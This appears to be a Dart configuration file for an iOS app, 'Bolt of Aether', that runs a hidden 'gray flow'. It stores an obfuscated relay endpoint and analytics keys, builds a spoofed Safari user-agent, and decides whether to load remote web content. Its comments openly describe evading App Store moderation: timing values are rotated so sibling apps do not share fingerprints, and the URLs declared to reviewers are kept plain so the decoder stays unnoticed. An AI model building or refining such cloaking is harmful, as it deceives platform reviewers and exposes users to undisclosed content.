import '../core/bolt_cipher.dart';

/// Single source of gray-flow configuration: encoded credentials, timing
/// invariants, and small helpers over both. Every timing constant here is
/// intentionally distinct from the template default (see
/// `apple_moderation_hardening.mdc` §7a) so this project does not cluster
/// with sibling apps on numeric fingerprints.
class AetherRelayConfig {
  const AetherRelayConfig._();

  // ---------------------------------------------------------------- identity

  /// Numeric App Store id, used for the GCD lookup on iOS and for the
  /// `store_id` field in the config body ("id" + this value).
  static const String iosStoreId = '6797957269';

  /// The marketing name that must match App Store Connect verbatim.
  static const String appDisplayName = 'Bolt of Aether';

  // ------------------------------------------------------- public plain URLs
  // These two URLs are declared in App Store Connect: encoding them buys
  // nothing and proves the app has decoder infrastructure (see
  // apple_moderation_hardening.mdc §3). Ship as plain constants.

  static const String privacyUrl =
      'https://boltofaether.com/privacy-policy.html';
  static const String supportUrl =
      'https://boltofaether.com/support.html';

  // ------------------------------------------------------- timing invariants
  // Every value below is deliberately off the template default. Do not round
  // them back — rotation is the whole point.

  /// How long the push-permission screen stays hidden after a Skip.
  static const int pushSnoozeSeconds = 388800; // 4.5 d (rotated off the template default)

  /// Delay between organic re-conversion attempts.
  static const int organicRecheckSeconds = 9; // rotated off the template default

  /// HTTP timeout for the config POST.
  static const Duration configTimeout = Duration(seconds: 17);

  /// How long buildPayload blocks waiting for the AppsFlyer conversion
  /// callback before composing the config body. Must be generous enough to
  /// catch a first-launch (non-cached) conversion on a slow network.
  static const Duration awaitSignalsInstall = Duration(seconds: 9);

  /// Post-frame delay before we present the ATT prompt.
  static const Duration attPromptDelay = Duration(milliseconds: 620);

  /// How many times we automatically reload after a -1007 redirect loop.
  static const int redirectRetryLimit = 4; // rotated off the template default (3)

  /// APNs token poll (before Firebase getToken()).
  static const int apnsPollAttempts = 7; // template default 5
  static const Duration apnsPollStep = Duration(milliseconds: 620); // template 500 ms

  /// Delay between onPageFinished and the follow-up resize+inset re-injection.
  static const Duration postLoadResizeDelay = Duration(milliseconds: 1120);

  /// Reflow poke delays after rotation, hitting the WKWebView until it
  /// stabilises in the new viewport.
  static const List<Duration> pokeReflowDelays = <Duration>[
    Duration(milliseconds: 55),
    Duration(milliseconds: 210),
    Duration(milliseconds: 430),
    Duration(milliseconds: 720),
    Duration(milliseconds: 980),
  ];

  /// Cold-start viewport settle before we mount the WKWebView.
  static const Duration coldViewportSettle = Duration(milliseconds: 340);

  /// Saved-url expiry — the router refuses to load a saved URL older than
  /// this. See `apple_moderation_hardening.mdc` §6.
  static const int savedUrlExpiryDays = 7;

  /// Minimum time the loading UI stays visible so a fast decision does not
  /// look like a flash. Non-round on purpose.
  static const Duration minimumSplash = Duration(milliseconds: 720);

  // --------------------------------------------------------- decoded getters

  static String get relayEndpoint => BoltCipher.reveal(_relayEndpoint);
  static String get appsflyerDevKey => BoltCipher.reveal(_appsflyerDevKey);
  static String get firebaseProjectId => BoltCipher.reveal(_firebaseProjectId);
  static String get gcdBaseUrl => BoltCipher.reveal(_gcdBaseUrl);
  static String get oneLinkTemplate => BoltCipher.reveal(_oneLinkTemplate);

  static String get uaProduct => BoltCipher.reveal(_uaProduct);
  static String get uaPlatformPrefix => BoltCipher.reveal(_uaPlatformPrefix);
  static String get uaPlatformSuffix => BoltCipher.reveal(_uaPlatformSuffix);
  static String get uaEngine => BoltCipher.reveal(_uaEngine);
  static String get uaMobileToken => BoltCipher.reveal(_uaMobileToken);
  static String get uaVersionTag => BoltCipher.reveal(_uaVersionTag);
  static String get uaSafariTag => BoltCipher.reveal(_uaSafariTag);
  static String get uaSafariTail => BoltCipher.reveal(_uaSafariTail);
  static String get uaSafariMajorMinor => BoltCipher.reveal(_uaSafariMajorMinor);
  static String get uaAppIdToken => BoltCipher.reveal(_uaAppIdToken);
  static String get uaAppNameToken => BoltCipher.reveal(_uaAppNameToken);
  static String get uaBundleValue => BoltCipher.reveal(_uaBundleValue);
  static String get uaAppNameValue => BoltCipher.reveal(_uaAppNameValue);

  static String get vaultPrefix => BoltCipher.reveal(_vaultPrefix);
  static String get vaultLaunchKey => BoltCipher.reveal(_vaultLaunchKey);

  // ------------------------------------------------------------- convenience

  /// `store_id` field value per the config-endpoint contract.
  static String get platformStoreId => 'id$iosStoreId';

  /// The predicate that decides whether the gray flow is enabled at all.
  /// Depends ONLY on the three fields the gray flow cannot function without —
  /// OneLink and similar optional fields are excluded so an empty OneLink
  /// never silently disables the whole flow. See gray_flow_lessons.md §4.
  static bool get grayCredentialsReady =>
      relayEndpoint.startsWith('http') &&
      appsflyerDevKey.length > 8 &&
      firebaseProjectId.length >= 6;

  // ================================================================
  // Generated by tool/encode_relay_values.dart — do NOT hand-edit.
  // Re-run the tool after rotating `_lcgSeed` in bolt_cipher.dart.
  // ================================================================

  static const List<int> _relayEndpoint = <int>[0x09, 0xC9, 0x50, 0x03, 0x3D, 0xCF, 0xC2, 0xDD, 0x68, 0xBF, 0xF0, 0x96, 0xB0, 0x29, 0x66, 0x47, 0xD1, 0x75, 0x26, 0x36, 0xD8, 0x54, 0x94, 0xBA, 0xB0, 0xAD, 0x92, 0x89, 0x3E, 0x00, 0x70, 0xED, 0xC5, 0x27, 0x52];
  static const List<int> _appsflyerDevKey = <int>[0x37, 0xD9, 0x7E, 0x40, 0x3E, 0xB6, 0xA7, 0x93, 0x5B, 0x9E, 0xF6, 0xA3, 0xAA, 0x07, 0x74, 0x77, 0xEE, 0x25, 0x10, 0x2F, 0x87, 0x60];
  static const List<int> _firebaseProjectId = <int>[0x57, 0x8A, 0x12, 0x46, 0x7A, 0xC5, 0xD9, 0xC0, 0x33, 0xE6, 0xA5, 0xD6];
  static const List<int> _gcdBaseUrl = <int>[0x09, 0xC9, 0x50, 0x03, 0x3D, 0xCF, 0xC2, 0xDD, 0x6D, 0xB3, 0xF8, 0x91, 0xBB, 0x24, 0x29, 0x43, 0xD5, 0x6D, 0x30, 0x22, 0x9A, 0x4E, 0x9E, 0xA5, 0xB1, 0xAD, 0x92, 0x8A, 0x77, 0x00, 0x79, 0xB0, 0xC1, 0x2E, 0x4E, 0x6C, 0x02, 0x41, 0x3D, 0xCF, 0x1A, 0xFA, 0x8A, 0x11, 0x5C, 0x80, 0x2E];
  static const List<int> _oneLinkTemplate = <int>[0x09, 0xC9, 0x50, 0x03, 0x3D, 0xCF, 0xC2, 0xDD, 0x68, 0xBF, 0xF0, 0x96, 0xBE, 0x2A, 0x73, 0x4A, 0xC0, 0x6F, 0x6D, 0x2B, 0x98, 0x52, 0x97, 0xBE, 0xF1, 0xA5, 0xD3, 0x8A, 0x3D, 0x46, 0x24, 0xF1, 0xD9, 0x25, 0x0D, 0x35, 0x2D, 0x11, 0x29, 0x8E, 0x42, 0xBE, 0x93];
  static const List<int> _uaProduct = <int>[0x2C, 0xD2, 0x5E, 0x1A, 0x22, 0x99, 0x8C, 0xDD, 0x3F, 0xFE, 0xAC];
  static const List<int> _uaPlatformPrefix = <int>[0x49, 0xD4, 0x74, 0x1B, 0x21, 0x9B, 0x88, 0xC9, 0x2A, 0x93, 0xCC, 0xB7, 0xFF, 0x26, 0x57, 0x4A, 0xCA, 0x73, 0x26, 0x64, 0xB9, 0x64];
  static const List<int> _uaPlatformSuffix = <int>[0x0D, 0xD4, 0x4F, 0x16, 0x6E, 0xB8, 0x8C, 0x91, 0x2A, 0x9F, 0xCF, 0xC2, 0x87, 0x66];
  static const List<int> _uaEngine = <int>[0x20, 0xCD, 0x54, 0x1F, 0x2B, 0xA2, 0x88, 0x90, 0x41, 0xB9, 0xE8, 0xCD, 0xE9, 0x7F, 0x32, 0x0C, 0x94, 0x33, 0x72, 0x71, 0xD6, 0x1F, 0xB0, 0x9F, 0xCB, 0x83, 0xB1, 0xCB, 0x78, 0x05, 0x7E, 0xA8, 0xD0, 0x6F, 0x65, 0x65, 0x3E, 0x4E, 0x33, 0x92];
  static const List<int> _uaMobileToken = <int>[0x2C, 0xD2, 0x46, 0x1A, 0x22, 0x90, 0xC2, 0xC3, 0x3F, 0x95, 0xAD, 0xD6, 0xE7];
  static const List<int> _uaVersionTag = <int>[0x37, 0xD8, 0x56, 0x00, 0x27, 0x9A, 0x83, 0xDD];
  static const List<int> _uaSafariTag = <int>[0x32, 0xDC, 0x42, 0x12, 0x3C, 0x9C, 0xC2];
  static const List<int> _uaSafariTail = <int>[0x57, 0x8D, 0x10, 0x5D, 0x7F];
  static const List<int> _uaSafariMajorMinor = <int>[0x50, 0x85, 0x0A, 0x41];
  static const List<int> _uaAppIdToken = <int>[0x00, 0xCD, 0x54, 0x1A, 0x2A, 0xDA];
  static const List<int> _uaAppNameToken = <int>[0x00, 0xCD, 0x54, 0x1D, 0x2F, 0x98, 0x88, 0xDD];
  static const List<int> _uaBundleValue = <int>[0x02, 0xD2, 0x49, 0x5D, 0x2C, 0x9A, 0x81, 0x86, 0x6B, 0xB5, 0xE8, 0x8A, 0xBA, 0x3D, 0x29, 0x40, 0xCA, 0x71, 0x37, 0x25, 0x93, 0x43, 0x93, 0xB2, 0xED, 0xA9, 0x9C, 0x8A, 0x3D];
  static const List<int> _uaAppNameValue = <int>[0x23, 0xD2, 0x48, 0x07, 0x01, 0x93, 0xAC, 0x97, 0x7E, 0xB8, 0xF9, 0x90];
  static const List<int> _vaultPrefix = <int>[0x00, 0xDA, 0x45, 0x07, 0x2B, 0xDB, 0x9F, 0x97, 0x66, 0xB1, 0xE5, 0xCC];
  static const List<int> _vaultLaunchKey = <int>[0x00, 0xDA, 0x45, 0x07, 0x2B, 0xAA, 0x81, 0x93, 0x7F, 0xBE, 0xFF, 0x8A, 0x80, 0x3D, 0x68, 0x57, 0xD1, 0x78];
}
